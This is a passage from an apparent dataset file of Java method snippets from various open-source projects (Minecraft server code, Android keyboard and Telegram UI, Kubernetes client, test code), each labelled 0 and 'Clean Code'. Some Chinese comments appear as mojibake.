  remark=""鏂囩珷鏍囬锛�"" + title;
}
break;
case SEARCH:
if (result.getCode() == 200) {
String query=(String)requestParams.get(""query"");
content=query;
remark=""鎼滅储鍐呭锛�"" + query;
}
break;
case CATEGORY:
String categoryName=(String)requestParams.get(""categoryName"");
content=categoryName;
remark=""鍒嗙被鍚嶇О锛�"" + categoryName + ""锛岀""+ requestParams.get(""pageNum"")+ ""椤�"";
break;
case TAG:
String tagName=(String)requestParams.get(""tagName"");
content=tagName;
remark=""鏍囩鍚嶇О锛�"" + tagName + ""锛岀""+ requestParams.get(""pageNum"")+ ""椤�"";
break;
case CLICK_FRIEND:
String nickname=(String)requestParams.get(""nickname"");
content=nickname;
remark=""鍙嬮摼鍚嶇О锛�"" + nickname;
break;
}
return new VisitLogRemark(content,remark);
}",0,Clean Code
"public void spawnIn(Level world){
  this.setLevel(world);
  if (world == null) {
    this.bridge$revive();
    Vec3 position=null;
    if (this.respawnDimension != null && (world=ArclightServer.getMinecraftServer().getLevel(this.respawnDimension)) != null && this.getRespawnPosition() != null) {
      position=Player.findRespawnPositionAndUseSpawnBlock((ServerLevel)world,this.getRespawnPosition(),this.getRespawnAngle(),false,false).orElse(null);
    }
    if (world == null || position == null) {
      world=((CraftWorld)Bukkit.getServer().getWorlds().get(0)).getHandle();
      position=Vec3.atCenterOf(((ServerLevel)world).getSharedSpawnPos());
    }
    this.setLevel(world);
    this.setPos(position.x(),position.y(),position.z());
  }
  this.gameMode.setLevel((ServerLevel)world);
}",0,Clean Code
"/** 
 * find the mock method fit for specified method node
 * @param memberInjectMethods mock methods available
 * @param node                method node to match for
 * @return mock method info
 */
private MethodInfo getMemberInjectMethodName(Set<MethodInfo> memberInjectMethods,MethodInsnNode node){
  for (  MethodInfo m : memberInjectMethods) {
    String nodeOwner=ClassUtil.fitCompanionClassName(node.owner);
    String nodeName=ClassUtil.fitKotlinAccessorName(node.name);
    String nodeDesc=nodeName.equals(node.name) ? node.desc : MethodUtil.removeFirstParameter(node.desc);
    if (m.getClazz().equals(nodeOwner) && m.getName().equals(nodeName) && m.getDesc().equals(nodeDesc)) {
      return m;
    }
  }
  return null;
}
",0,Clean Code
"@Test public void testGetNotifyMessagePage(){
  NotifyMessageDO dbNotifyMessage=randomPojo(NotifyMessageDO.class,o -> {
    o.setUserId(1L);
    o.setUserType(UserTypeEnum.ADMIN.getValue());
    o.setTemplateCode(""test_01"");
    o.setTemplateType(10);
    o.setCreateTime(buildTime(2022,1,2));
    o.setTemplateParams(randomTemplateParams());
  }
);
  notifyMessageMapper.insert(dbNotifyMessage);
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setUserId(2L)));
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setUserType(UserTypeEnum.MEMBER.getValue())));
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setTemplateCode(""test_11"")));
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setTemplateType(20)));
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setCreateTime(buildTime(2022,2,1))));
  NotifyMessagePageReqVO reqVO=new NotifyMessagePageReqVO();
  reqVO.setUserId(1L);
  reqVO.setUserType(UserTypeEnum.ADMIN.getValue());
  reqVO.setTemplateCode(""est_01"");
  reqVO.setTemplateType(10);
  reqVO.setCreateTime(buildBetweenTime(2022,1,1,2022,1,10));
  PageResult<NotifyMessageDO> pageResult=notifyMessageService.getNotifyMessagePage(reqVO);
  assertEquals(1,pageResult.getTotal());
  assertEquals(1,pageResult.getList().size());
  assertPojoEquals(dbNotifyMessage,pageResult.getList().get(0));
}",0,Clean Code
"@Override @Audit(action=""REMOVE_BATCH_LOGPOINT"",domain=""LOGPOINT"") public RemoveBatchLogPointResponse handleRequest(ChannelInfo channelInfo,RemoveBatchLogPointRequest request,RequestContext requestContext){
  RemoveBatchLogPointResponse removeBatchLogPointResponse=new RemoveBatchLogPointResponse();
  if (request.isPersist() && request.getLogPointIds() != null && !request.getLogPointIds().isEmpty()) {
    long deletedCount=logPointService.removeLogPoints(channelInfo.getWorkspaceId(),channelInfo.getUserId(),request.getLogPointIds());
    removeBatchLogPointResponse.setDeletedLogPointCount(deletedCount);
    removeBatchLogPointResponse.setUndeletedLogPointCount(request.getLogPointIds().size() - deletedCount);
  }
  List<String> applicationInstanceIds=new ArrayList<>(filterApplications(channelInfo.getWorkspaceId(),request.getLogPointIds()));
  sendRequestToApps(channelInfo,request.getId(),requestContext.getRequestMessage(),applicationInstanceIds);
  removeBatchLogPointResponse.setApplicationInstanceIds(applicationInstanceIds);
  removeBatchLogPointResponse.setRequestId(request.getId());
  removeBatchLogPointResponse.setErroneous(false);
  auditLogService.getCurrentAuditLog().ifPresent(auditLog -> {
    setAuditLogUserInfo(auditLog,channelInfo,request.getClient());
    auditLog.addAuditLogField(""applicationInstanceIds"",applicationInstanceIds);
  }
);
  return removeBatchLogPointResponse;
}
",0,Clean Code
"/** 
 * Sets embed fields.
 * @param fields {@link List} of {@link EmbedField}
 * @return {@link MessageEmbedBuilder} for chaining.
 * @see MessageEmbedBuilder#createField(String,String,Boolean)
 */
public MessageEmbedBuilder setFields(List<EmbedField> fields){
  try {
    fieldsField.set(embed,fields);
  }
 catch (  Throwable e) {
    Main.logger.error(e);
  }
  return this;
}
",0,Clean Code
"/** 
 * 鍙戦�佸甫鍐呭鐨勯�氱煡
 * @param userId
 * @param employeeId
 * @param typeId
 * @param type
 * @param title
 * @param content 鍐呭
 */
public void sendContentMessage(Long userId,Integer employeeId,Integer typeId,Integer type,String title,String content){
  AdminMessage adminMessage=new AdminMessage();
  adminMessage.setCreateUser(userId);
  adminMessage.setCreateTime(DateUtil.formatDateTime(new Date()));
  adminMessage.setRecipientUser(EmployeeCacheUtil.getUserId(employeeId));
  adminMessage.setTypeId(typeId);
  adminMessage.setLabel(8);
  adminMessage.setType(type);
  adminMessage.setTitle(title);
  adminMessage.setContent(content);
  adminMessageService.save(adminMessage);
}",0,Clean Code
"/** 
 * Compares the contents of the character array with the typed word and returns true if they are the same.
 * @param word the array of characters that make up the word
 * @param length the number of valid characters in the character array
 * @param typedWord the word to compare with
 * @return true if they are the same, false otherwise.
 */
protected boolean same(final char[] word,final int length,final String typedWord){
  if (typedWord.length() != length) {
    return false;
  }
  for (int i=0; i < length; i++) {
    if (word[i] != typedWord.charAt(i)) {
      return false;
    }
  }
  return true;
}",0,Clean Code
"/** 
 * Returns the index of the parameter declared with the given type, ensuring that there is exactly one such parameter.
 * @throws NoSuchFieldError if there is no or more than one parameter with that type.
 * @hide
 */
public static int getParameterIndexByType(Member method,Class<?> type){
  Class<?>[] classes=(method instanceof Method) ? ((Method)method).getParameterTypes() : ((Constructor)method).getParameterTypes();
  int idx=-1;
  for (int i=0; i < classes.length; i++) {
    if (classes[i] == type) {
      if (idx == -1) {
        idx=i;
      }
 else {
        throw new NoSuchFieldError(""More than one parameter of type "" + type + "" found in ""+ method);
      }
    }
  }
  if (idx != -1) {
    return idx;
  }
 else {
    throw new NoSuchFieldError(""No parameter of type "" + type + "" found in ""+ method);
  }
}",0,Clean Code
"@SuppressWarnings(""deprecation"") @NonNull @Override public Object instantiateItem(@NonNull ViewGroup container,int position){
  if (mFragments.size() > position) {
    Fragment f=mFragments.get(position);
    if (f != null) {
      return f;
    }
  }
  if (mCurTransaction == null) {
    mCurTransaction=mFragmentManager.beginTransaction();
  }
  Fragment fragment=getItem(position);
  if (DEBUG)   Log.v(TAG,""Adding item #"" + position + "": f=""+ fragment);
  if (mSavedState.size() > position) {
    Fragment.SavedState fss=mSavedState.get(position);
    if (fss != null) {
      fragment.setInitialSavedState(fss);
    }
  }
  while (mFragments.size() <= position) {
    mFragments.add(null);
  }
  fragment.setMenuVisibility(false);
  if (mBehavior == BEHAVIOR_SET_USER_VISIBLE_HINT) {
    fragment.setUserVisibleHint(false);
  }
  mFragments.set(position,fragment);
  mCurTransaction.add(container.getId(),fragment);
  if (mBehavior == BEHAVIOR_RESUME_ONLY_CURRENT_FRAGMENT) {
    mCurTransaction.setMaxLifecycle(fragment,Lifecycle.State.STARTED);
  }
  return fragment;
}
",0,Clean Code
"private static Vector3f getCurrentSelectedBlockPos(){
  HitResult hitResult=Minecraft.getInstance().hitResult;
  if (Minecraft.getInstance().level != null && ((GameRendererAccessor)Minecraft.getInstance().gameRenderer).shouldRenderBlockOutlineA() && hitResult != null && hitResult.getType() == HitResult.Type.BLOCK) {
    BlockPos blockPos4=((BlockHitResult)hitResult).getBlockPos();
    return blockPos4.getCenter().subtract(Minecraft.getInstance().gameRenderer.getMainCamera().getPosition()).toVector3f();
  }
  return new Vector3f(-256.0f);
}",0,Clean Code
"@Override public void onSurfaceTextureUpdated(SurfaceTexture surface){
  if (!inited && cameraSession[0] != null && cameraSession[0].isInitiated()) {
    if (delegate != null) {
      delegate.onCameraInit();
    }
    inited=true;
    if (lazy) {
      textureView.setAlpha(0);
      showTexture(true,true);
    }
  }
}",0,Clean Code
"public String buildGenerateReorderColumnSql(Table oldTable,Table newTable){
  StringBuilder sql=new StringBuilder();
  int n=0;
  Map<String,Integer> oldColumnIndexMap=new HashMap<>();
  for (int i=0; i < oldTable.getColumnList().size(); i++) {
    oldColumnIndexMap.put(oldTable.getColumnList().get(i).getName(),i);
  }
  String[] oldColumnArray=oldTable.getColumnList().stream().map(TableColumn::getName).toArray(String[]::new);
  String[] newColumnArray=newTable.getColumnList().stream().map(TableColumn::getName).toArray(String[]::new);
  Set<String> oldColumnSet=new HashSet<>(Arrays.asList(oldColumnArray));
  Set<String> newColumnSet=new HashSet<>(Arrays.asList(newColumnArray));
  if (!oldColumnSet.equals(newColumnSet)) {
    return """";
  }
  buildSql(oldColumnArray,newColumnArray,sql,oldTable,newTable,n);
  return sql.toString();
}",0,Clean Code
"private void setKeyIconColor(Key key,Drawable icon,Keyboard keyboard){
  if (key.isAccentColored()) {
    mColors.setColor(icon,ColorType.ACTION_KEY_ICON);
  }
 else   if (key.isShift() && keyboard != null) {
    if (keyboard.mId.mElementId == KeyboardId.ELEMENT_ALPHABET_MANUAL_SHIFTED || keyboard.mId.mElementId == KeyboardId.ELEMENT_ALPHABET_SHIFT_LOCKED || keyboard.mId.mElementId == KeyboardId.ELEMENT_ALPHABET_AUTOMATIC_SHIFTED || keyboard.mId.mElementId == KeyboardId.ELEMENT_ALPHABET_SHIFT_LOCK_SHIFTED)     mColors.setColor(icon,ColorType.SHIFT_KEY_ICON);
 else     mColors.setColor(icon,ColorType.KEY_ICON);
  }
 else   if (key.getBackgroundType() != Key.BACKGROUND_TYPE_NORMAL) {
    mColors.setColor(icon,ColorType.KEY_ICON);
  }
 else   if (this instanceof PopupKeysKeyboardView) {
    mColors.setColor(icon,ColorType.KEY_ICON);
  }
 else   if (key.getCode() == Constants.CODE_SPACE || key.getCode() == KeyCode.ZWNJ) {
    mColors.setColor(icon,ColorType.KEY_ICON);
  }
 else {
    mColors.setColor(icon,ColorType.KEY_TEXT);
  }
}
",0,Clean Code
"public String getAlias(String asName){
  if (CollectionUtils.isNotEmpty(entry)) {
    List<KeyStoreEntry> entryList=this.entry.stream().filter(ks -> StringUtils.equals(asName,ks.getNewAsName())).collect(Collectors.toList());
    if (CollectionUtils.isNotEmpty(entryList) && CollectionUtils.isNotEmpty(files) && files.size() == 1) {
      return entryList.get(0).getOriginalAsName();
    }
  }
  return asName;
}",0,Clean Code
"/** 
 * chat with wenxin chat openai
 * @param queryRequest
 * @param sseEmitter
 * @param uid
 * @return
 * @throws IOException
 */
private SseEmitter chatWithWenxinAi(ChatQueryRequest queryRequest,SseEmitter sseEmitter,String uid) throws IOException {
  String prompt=buildPrompt(queryRequest);
  List<FastChatMessage> messages=getFastChatMessage(uid,prompt);
  if (messages.size() >= 2 && messages.size() % 2 == 0) {
    messages.remove(messages.size() - 1);
  }
  buildSseEmitter(sseEmitter,uid);
  WenxinAIEventSourceListener sourceListener=new WenxinAIEventSourceListener(sseEmitter);
  WenxinAIClient.getInstance().streamCompletions(messages,sourceListener);
  LocalCache.CACHE.put(uid,messages,LocalCache.TIMEOUT);
  return sseEmitter;
}",0,Clean Code
"/** 
 * 搴旂敤 PVC 鍒 K8S 闆嗙兢
 * @param client K8S Client
 * @param pvc PVC CR 瀵硅薄
 */
private void applyPvc(DefaultKubernetesClient client,JSONObject pvc){
  try {
    String namespace=getComponent().getNamespaceId();
    String name=pvc.getJSONObject(""metadata"").getString(""name"");
    pvc.getJSONObject(""metadata"").put(""namespace"",namespace);
    Resource<PersistentVolumeClaim> resource=client.persistentVolumeClaims().load(new ByteArrayInputStream(pvc.toJSONString().getBytes(StandardCharsets.UTF_8)));
    PersistentVolumeClaim current=client.persistentVolumeClaims().inNamespace(namespace).withName(name).get();
    if (current == null) {
      PersistentVolumeClaim result=resource.create();
      log.info(""cr yaml has created in kubernetes|namespace={}|name={}|cr={}|result={}"",namespace,name,pvc.toJSONString(),JSONObject.toJSONString(result));
    }
 else {
      log.info(""cr exists, do nothing|namespace={}|name={}|pvc={}"",namespace,name,pvc.toJSONString());
    }
  }
 catch (  Exception e) {
    String errorMessage=String.format(""apply cr yaml to kubernetes failed|cluster=%s|"" + ""exception=%s|cr=%s"",client,ExceptionUtils.getStackTrace(e),pvc.toJSONString());
    log.error(errorMessage);
    throw new AppException(AppErrorCode.INVALID_USER_ARGS,errorMessage);
  }
}",0,Clean Code
"/** 
 * @param uuid The {@link UUID} of the DRM scheme, or {@link C#UUID_NIL} if the data isuniversal (i.e. applies to all schemes).
 * @param mimeType See {@link #mimeType}.
 * @param data See {@link #data}.
 */
public SchemeData(UUID uuid,String mimeType,@Nullable byte[] data){
  this(uuid,mimeType,data,false);
}
/** 
 * @param uuid The {@link UUID} of the DRM scheme, or {@link C#UUID_NIL} if the data isuniversal (i.e. applies to all schemes).
 * @param mimeType See {@link #mimeType}.
 * @param data See {@link #data}.
 * @param requiresSecureDecryption See {@link #requiresSecureDecryption}.
 */
public SchemeData(UUID uuid,String mimeType,@Nullable byte[] data,boolean requiresSecureDecryption){
  this(uuid,null,mimeType,data,requiresSecureDecryption);
}
/** 
 * @param uuid The {@link UUID} of the DRM scheme, or {@link C#UUID_NIL} if the data isuniversal (i.e. applies to all schemes).
 * @param licenseServerUrl See {@link #licenseServerUrl}.
 * @param mimeType See {@link #mimeType}.
 * @param data See {@link #data}.
 * @param requiresSecureDecryption See {@link #requiresSecureDecryption}.
 */
public SchemeData(UUID uuid,@Nullable String licenseServerUrl,String mimeType,@Nullable byte[] data,boolean requiresSecureDecryption){
  this.uuid=Assertions.checkNotNull(uuid);
  this.licenseServerUrl=licenseServerUrl;
  this.mimeType=Assertions.checkNotNull(mimeType);
  this.data=data;
  this.requiresSecureDecryption=requiresSecureDecryption;
}
SchemeData(Parcel in){
  uuid=new UUID(in.readLong(),in.readLong());
  licenseServerUrl=in.readString();
  mimeType=Util.castNonNull(in.readString());
  data=in.createByteArray();
  requiresSecureDecryption=in.readByte() != 0;
}",0,Clean Code
"public List<Instance> updatedIPs(Collection<Instance> a,Collection<Instance> b){
  List<Instance> intersects=(List<Instance>)CollectionUtils.intersection(a,b);
  Map<String,Instance> stringIPAddressMap=new ConcurrentHashMap<>(intersects.size());
  for (  Instance instance : intersects) {
    stringIPAddressMap.put(instance.getIp() + "":"" + instance.getPort(),instance);
  }
  Map<String,Integer> intersectMap=new ConcurrentHashMap<>(a.size() + b.size());
  Map<String,Instance> instanceMap=new ConcurrentHashMap<>(a.size());
  Map<String,Instance> instanceMap1=new ConcurrentHashMap<>(a.size());
  for (  Instance instance : b) {
    if (stringIPAddressMap.containsKey(instance.getIp() + "":"" + instance.getPort())) {
      intersectMap.put(instance.toString(),1);
    }
  }
  for (  Instance instance : a) {
    if (stringIPAddressMap.containsKey(instance.getIp() + "":"" + instance.getPort())) {
      if (intersectMap.containsKey(instance.toString())) {
        intersectMap.put(instance.toString(),2);
      }
 else {
        intersectMap.put(instance.toString(),1);
      }
    }
    instanceMap1.put(instance.toString(),instance);
  }
  for (  Map.Entry<String,Integer> entry : intersectMap.entrySet()) {
    String key=entry.getKey();
    Integer value=entry.getValue();
    if (value == 1) {
      if (instanceMap1.containsKey(key)) {
        instanceMap.put(key,instanceMap1.get(key));
      }
    }
  }
  return new ArrayList<>(instanceMap.values());
}",0,Clean Code
"public static void checkRestrictedLanguages(boolean accountsChanged){
  boolean manualChanged=MessagesController.getGlobalMainSettings().getBoolean(""translate_button_restricted_languages_changed"",false);
  int version=MessagesController.getGlobalMainSettings().getInt(""translate_button_restricted_languages_version"",0);
  if (version != LAST_DO_NOT_TRANSLATE_VERSION || accountsChanged && !manualChanged) {
    getExtendedDoNotTranslate(languages -> {
      final String currentLangCode=LocaleController.getInstance().getCurrentLocaleInfo().pluralLangCode;
      languages.addAll(getRestrictedLanguages());
      SharedPreferences.Editor edit=MessagesController.getGlobalMainSettings().edit();
      if (languages.size() == 1 && TextUtils.equals(languages.iterator().next(),currentLangCode)) {
        edit.remove(""translate_button_restricted_languages"");
      }
 else {
        edit.putStringSet(""translate_button_restricted_languages"",languages);
      }
      edit.putInt(""translate_button_restricted_languages_version"",LAST_DO_NOT_TRANSLATE_VERSION).apply();
      invalidateRestrictedLanguages();
      for (      int i : SharedConfig.activeAccounts) {
        final int account=i;
        try {
          MessagesController.getInstance(account).getTranslateController().checkRestrictedLanguagesUpdate();
        }
 catch (        Exception ignore) {
        }
      }
    }
);
  }
}",0,Clean Code
"public void updateCurrentFragment(SettingsGroup group){
  if (group == null) {
    return;
  }
  if (mCurrentFragment == null) {
    Log.e(TAG,""Page row fragment not initialized for group: "" + group.getTitle());
    return;
  }
  if (mCurrentFragment instanceof SettingsSection) {
    ((SettingsSection)mCurrentFragment).update(group);
  }
 else {
    Log.e(TAG,""updateFragment: Page group fragment has incompatible type: "" + mCurrentFragment.getClass().getSimpleName());
  }
}
public void updateCurrentFragment(VideoGroup group){
  if (group == null) {
    return;
  }
  if (mCurrentFragment == null) {
    Log.e(TAG,""Page row fragment not initialized for group: "" + group.getTitle());
    return;
  }
  updateVideoFragment(mCurrentFragment,group);
}
",0,Clean Code
"private void debugDrawPoints(final Canvas canvas,final int startIndex,final int endIndex,final Paint paint){
  final int[] xCoords=mXCoordinates.getPrimitiveArray();
  final int[] yCoords=mYCoordinates.getPrimitiveArray();
  final int[] pointTypes=mPointTypes.getPrimitiveArray();
  paint.setAntiAlias(false);
  paint.setStrokeWidth(0);
  for (int i=startIndex; i < endIndex; i++) {
    final int pointType=pointTypes[i];
    if (pointType == POINT_TYPE_INTERPOLATED) {
      paint.setColor(Color.RED);
    }
 else     if (pointType == POINT_TYPE_SAMPLED) {
      paint.setColor(0xFFA000FF);
    }
 else {
      paint.setColor(Color.GREEN);
    }
    canvas.drawPoint(getXCoordValue(xCoords[i]),yCoords[i],paint);
  }
  paint.setAntiAlias(true);
}",0,Clean Code
"/** 
 * Removes given config option from the configuration.
 * @param configOption config option to remove
 * @param < T > Type of the config option
 * @return true is config has been removed, false otherwise
 */
public <T>boolean remove(ConfigOption<T> configOption){
synchronized (this.confData) {
    final BiFunction<String,Boolean,Optional<Boolean>> applier=(key,canBePrefixMap) -> {
      if (canBePrefixMap && removePrefixMap(this.confData,key) || this.confData.remove(key) != null) {
        return Optional.of(true);
      }
      return Optional.empty();
    }
;
    return applyWithOption(configOption,applier).orElse(false);
  }
}
",0,Clean Code
"private void purgeExpiredFragments(String handle){
synchronized (this.fragments) {
    long timenow=System.currentTimeMillis();
    Iterator<Entry<TextCategory,ArrayList<TextFragment>>> itCat=this.fragments.entrySet().iterator();
    while (itCat.hasNext()) {
      Map.Entry<TextCategory,ArrayList<TextFragment>> pair=(Map.Entry<TextCategory,ArrayList<TextFragment>>)itCat.next();
      if (pair.getValue() != null) {
        Iterator<TextFragment> itFrag=pair.getValue().iterator();
        while (itFrag.hasNext()) {
          TextFragment frag=itFrag.next();
          if ((frag.expirationTime != -1 && frag.expirationTime < timenow) || (handle != null && frag.handle != null && frag.handle.equals(handle)))           itFrag.remove();
        }
      }
    }
  }
}",0,Clean Code
